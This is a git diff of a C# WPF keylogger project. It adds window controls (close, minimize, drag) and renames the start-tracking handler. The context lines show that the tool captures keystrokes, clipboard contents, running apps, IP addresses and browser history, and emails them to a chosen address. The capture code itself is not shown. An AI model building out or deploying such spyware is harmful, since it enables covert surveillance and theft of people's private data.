@@ -9,6 +9,7 @@ using System.Data;
 using System.Collections.Generic;
 using System.Data.SQLite;
 using System.Threading;
+using System.Windows.Input;
 
 namespace Keylogger
 {
@@ -56,7 +57,7 @@ namespace Keylogger
             InitializeComponent();
         }
 
-        private void StartTracking_Click(object sender, RoutedEventArgs e)
+        private void StartTrackingButton(object sender, MouseButtonEventArgs e)
         {
             checkBoxes boxes = new checkBoxes((bool)IpAdd.IsChecked, (bool)Apps.IsChecked, (bool)Keys.IsChecked, (bool)Copied.IsChecked, (bool)History.IsChecked);
             emailTo = emailToSend.Text;
@@ -133,6 +134,8 @@ namespace Keylogger
                 //MessageBox.Show(clipboardContent);
             }
         }
+
+       
 
         void getMainProcess(StreamWriter sw)
         {
@@ -462,6 +465,48 @@ namespace Keylogger
             }
 
         }
+
+        private void CloseApp(object sender, System.Windows.Input.MouseButtonEventArgs e)
+        {
+            try
+            {
+                Close();
+            }
+            catch(Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+        }
+
+        private void Minimize(object sender, System.Windows.Input.MouseButtonEventArgs e)
+        {
+            try
+            {
+                this.WindowState = WindowState.Minimized;
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+        }
+
+
+       
+
+        private void Move(object sender, MouseButtonEventArgs e)
+        {
+            if (e.LeftButton == MouseButtonState.Pressed)
+            {
+                this.DragMove();
+            }
+        }
+
+       
+
+
+
+
+
 
 
 
